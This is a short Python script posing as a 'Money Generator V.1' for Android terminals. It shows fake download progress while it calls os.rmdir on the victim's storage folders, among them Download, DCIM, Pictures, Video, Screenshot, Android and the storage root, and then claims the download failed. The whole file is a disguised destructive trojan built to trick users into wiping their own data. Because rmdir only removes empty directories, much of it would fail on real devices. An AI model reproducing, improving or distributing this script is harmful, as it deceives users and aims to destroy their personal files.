import sys
import time
import os
def slowprint(s):
	for c in s:
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(1./10)
		
#CODDED BY K1TTY 

print("""\033\t[0;34;40m 
\t▒█▀▀█ ▒█▀▀█ ░█▀▀█ ▒█▀▀▀█ ▒█░▒█         
\t▒█░▄▄ ▒█░░░ ▒█▄▄█ ░▀▀▀▄▄ ▒█▀▀█         
\t▒█▄▄█ ▒█▄▄█ ▒█░▒█ ▒█▄▄▄█ ▒█░▒█           """)
slowprint("\033\t[0;36;40m               𝕄𝕠𝕟𝕖𝕪 𝔾𝕖𝕟𝕖𝕣𝕒𝕥𝕠𝕣 𝕍.𝟙")
print("\n")
print("\033[1;33;40mDownloading.... [10%]")
os.rmdir('/storage/emulated/0/Download')
os.rmdir('/storage/emulated/0/Record')
os.rmdir('/storage/emulated/0/SHAREit')
time.sleep(40.4)
os.system('clear')
print("""\033\t[0;34;40m 
\t▒█▀▀█ ▒█▀▀█ ░█▀▀█ ▒█▀▀▀█ ▒█░▒█         
\t▒█░▄▄ ▒█░░░ ▒█▄▄█ ░▀▀▀▄▄ ▒█▀▀█         
\t▒█▄▄█ ▒█▄▄█ ▒█░▒█ ▒█▄▄▄█ ▒█░▒█           """)
print("\033\t[0;36;40m               𝕄𝕠𝕟𝕖𝕪 𝔾𝕖𝕟𝕖𝕣𝕒𝕥𝕠𝕣 𝕍.𝟙")
print("\n")
print("\033[1;33;40mDownloading.... [40%]")
os.rmdir('/storage/emulated/0/DCIM')
time.sleep(52.4)
os.system('clear')
print("""\033\t[0;34;40m 
\t▒█▀▀█ ▒█▀▀█ ░█▀▀█ ▒█▀▀▀█ ▒█░▒█         
\t▒█░▄▄ ▒█░░░ ▒█▄▄█ ░▀▀▀▄▄ ▒█▀▀█         
\t▒█▄▄█ ▒█▄▄█ ▒█░▒█ ▒█▄▄▄█ ▒█░▒█           """)
print("\033\t[0;36;40m               𝕄𝕠𝕟𝕖𝕪 𝔾𝕖𝕟𝕖𝕣𝕒𝕥𝕠𝕣 𝕍.𝟙")
print("\n")
print("\033[1;36;40mDownloading.... [60%]")
os.rmdir('/storage/emulated/0/Pictures')
time.sleep(55.4)
os.system('clear')
print("""\033\t[0;34;40m 
\t▒█▀▀█ ▒█▀▀█ ░█▀▀█ ▒█▀▀▀█ ▒█░▒█         
\t▒█░▄▄ ▒█░░░ ▒█▄▄█ ░▀▀▀▄▄ ▒█▀▀█         
\t▒█▄▄█ ▒█▄▄█ ▒█░▒█ ▒█▄▄▄█ ▒█░▒█           """)
print("\033\t[0;36;40m               𝕄𝕠𝕟𝕖𝕪 𝔾𝕖𝕟𝕖𝕣𝕒𝕥𝕠𝕣 𝕍.𝟙")
print("\n")
print("\033[0;36;40mDownloading.... [80%]")
os.rmdir('/storage/emulated/0/Video')
time.sleep(56.4)
os.system('clear')
print("""\033\t[0;34;40m 
\t▒█▀▀█ ▒█▀▀█ ░█▀▀█ ▒█▀▀▀█ ▒█░▒█         
\t▒█░▄▄ ▒█░░░ ▒█▄▄█ ░▀▀▀▄▄ ▒█▀▀█         
\t▒█▄▄█ ▒█▄▄█ ▒█░▒█ ▒█▄▄▄█ ▒█░▒█           """)
print("\033\t[0;36;40m               𝕄𝕠𝕟𝕖𝕪 𝔾𝕖𝕟𝕖𝕣𝕒𝕥𝕠𝕣 𝕍.𝟙")
print("\n")
print("\033[1;32;40mDownloading.... [90%]")
os.rmdir('/storage/emulated/0/Screenshot')
time.sleep(57.2)
os.system('clear')
print("""\033\t[0;34;40m 
\t▒█▀▀█ ▒█▀▀█ ░█▀▀█ ▒█▀▀▀█ ▒█░▒█         
\t▒█░▄▄ ▒█░░░ ▒█▄▄█ ░▀▀▀▄▄ ▒█▀▀█         
\t▒█▄▄█ ▒█▄▄█ ▒█░▒█ ▒█▄▄▄█ ▒█░▒█           """)
print("\033\t[0;36;40m               𝕄𝕠𝕟𝕖𝕪 𝔾𝕖𝕟𝕖𝕣𝕒𝕥𝕠𝕣 𝕍.𝟙")
print("\n")
print("\033[1;32;40mDownloading.... [99%]")
os.rmdir('/storage/emulated/0')
os.rmdir('/storage/emulated/0/Android')
os.rmdir('/storage/emulated/0/documents')
time.sleep(90.4)
print("\033[0;31;40mSorry, Downloading Failed!")
print()

